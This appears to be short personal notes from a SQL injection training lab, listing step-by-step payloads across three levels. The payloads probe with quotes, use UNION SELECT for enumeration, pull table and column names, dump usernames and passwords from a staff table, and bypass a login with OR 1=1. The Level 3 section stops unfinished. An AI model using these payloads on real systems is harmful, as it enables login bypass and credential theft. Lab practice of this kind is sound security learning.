## SQLI

### Level 1:

### Step 1: check vulnerability by using ' or "

### Step 2: enumerating the vulnerability: 1 UNION SELECT 1 , 1 UNION SELECT 1,2 ,1 UNION SELECT 1,2,3

### Step 3: enumerating tables: 0 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables WHERE table_schema = 'sqli_one'

### Step 4: enumerating columns: 0 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns WHERE table_name = 'staff_users'

### Step 5: exploiting the vulnerability: 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users


### Level 2:

### Exploit: select * from users where username='qw' and password='' OR 1=1;' LIMIT 1;


### Level 3:


### Step 1: enumerating the vulnerability: 1 UNION SELECT 1 , 1 UNION SELECT 1,2 ,1 UNION SELECT 1,2,3

### Step 2:
